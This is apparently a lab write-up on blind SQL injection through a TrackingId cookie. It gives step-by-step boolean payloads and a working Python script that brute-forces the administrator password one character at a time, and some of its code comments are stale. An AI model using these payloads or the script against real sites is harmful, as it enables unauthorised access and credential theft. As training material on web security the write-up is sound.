* Title: Blind SQL injection with conditional responses

* Goal: Log in as the administrator user.

* Vulnerability Location: The TrackingId section in the Cookie
 (For this lab I'm gonna use Burp Suite. Intercept the network and send it to repeater to follow this write-up)

* Payload Used:

  ```' AND '1'='1``` , ```' AND (SELECT 'a' FROM users LIMIT 1)='a' --``` , 
  ```' AND (SELECT 'a' FROM users WHERE username='administrator')='a' --``` ,
  ```' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = 20)='a' --``` ,
  ```' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password, 1, 1) < 'm')='a' --```

* Steps:

  1. Check if the input is injectable. Inject: ```' AND '1'='1```
       If the page has the word "Welcome back", the input is being processed by SQL. That means we can move forward.

  2. Check if the users table exists. Inject: ```' AND (SELECT 'a' FROM users LIMIT 1)='a' --```  
       If the page still has the word "Welcome back", the users table exists and is accessible.

  3. Check if the administrator user exists. Inject: ```' AND (SELECT 'a' FROM users WHERE username='administrator')='a' -- ```
       If the page has the word "Welcome back", the administrator user is present in the table.

  4. Find the password length. Inject: ```' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = 20)='a' --```  
       Try different values for LENGTH(password) until the page  has the word "Welcome back". That tells you the exact length of the password.

       FYI: every password I encounter in this module has a password that is 20 characters long and it only include lowercase alphanumeric characters.

  5. Extract the password one character at a time Inject: ```' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password, 1, 1) < 'm')='a' --```
       This checks if the first character is alphabetically less than 'm'. If the page has the word "Welcome back", the condition is true. 

       Use binary search or loop through characters to find the correct one. Then move to the next character: ```SUBSTRING(password, 2, 1)```, and try ```SUBSTRING(password, 3, 1)```... 

       Repeat until you get the full password, which I personally think is painful and boring. And that's why we're are gonna automate this using a python script.

* Python Script

  ```
              # Import necessary modules: urllib3, urllib.parse, sys, requests
        import urllib.parse
        import urllib3
        import sys
        import requests
        
        # Disable SSL warnings from urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Define a function called password_injector with parameters: url, base_tracking_id, session_id
        def password_injector(url, base_tracking_id, session_id):
        
            # Initialize an empty string to store the extracted password
            extracted_password = ""
        
            #Alphanumeric characters The password contains
            charset = "abcdefghijklmnopqrstuvwxyz0123456789"
        
            # Loop through each character position in the password (1 to 20)
            for i in range(1,21):
        
                # Loop through ASCII characters from 48 to 125
                for ch in charset:
        
                    # Create a SQL injection payload to check if the character at position i matches chr(j)
                    sql_injection_payload = f"' AND (SELECT SUBSTRING(password, {i},1) FROM users WHERE username='administrator')='{ch}'--"
        
                    # URL-encode the payload
                    sql_injection_payload_encoded = urllib.parse.quote(sql_injection_payload)
        
                    # Construct cookies with the encoded payload appended to the TrackingId and include session ID
                    cookies = {"TrackingId" : base_tracking_id + sql_injection_payload_encoded, "session" : session_id}
        
                    # Send a GET request to the target URL with the cookies and SSL verification disabled
                    response = requests.get(url, cookies=cookies, verify=False)
        
                    # If the response status code is 500 (indicating a match and error from division by zero):
                    if "Welcome" not in response.text:
                        
                        # Print the current guess character along with the known part of the password
                        sys.stdout.write('\r' + extracted_password + ch)
                        sys.stdout.flush()
        
                    else:
                        # Append the matching character to the password string
                        extracted_password += ch
        
                        # Print the current password progress on the same line
                        sys.stdout.write('\r' + extracted_password)
                        sys.stdout.flush()
                        
                        # Break out of the inner loop to move to the next character position
                        break
        
            print(f"Extracted Password: {extracted_password}")
        
        
        # Define a main function
        def main():
        
            # Check if the number of command-line arguments is correct
            if len(sys.argv) != 4:
        
                # If not, print usage instructions and exit
                print(f"Usage: {sys.argv[0]} <url> tracking_id session_id")
                print(f"Example: {sys.argv[0]} https://0ac5005103a1e7f580381c3600720043.web-security-academy.net UQTMpS4wWgjxNFwz 2jDhZO5t4nfaxS0xZyzKvPwDVw4w4Ed7")
                sys.exit(-1)
        
        
            # Extract url, tracking_id, and session_id from command-line arguments
            url = sys.argv[1]
            tracking_id = sys.argv[2]
            session_id = sys.argv[3]
        
            # Print a message indicating password retrieval is starting
            print("[+] Password Retrieving Started...")
        
            # Call the password_injector function with the provided arguments
            password_injector(url, tracking_id, session_id)
        
        # Run the main function if the script is executed directly
        if __name__ == "__main__":
            main()
  ```


* Takeaway: Blind SQL injection is slow and annoying, but it works. You don’t get direct output — you just watch how the page reacts to true or false conditions. If the page says “Welcome back,” your guess was right. If it doesn’t, try again.

This lab teaches you how to extract data one character at a time using logic, patience, and a bit of brute force. It’s not flashy, but it’s reliable — and once you automate it with a script, it becomes way less painful.

The key is knowing how to ask the database yes/no questions and read the answer from the page behavior. That’s the whole game.
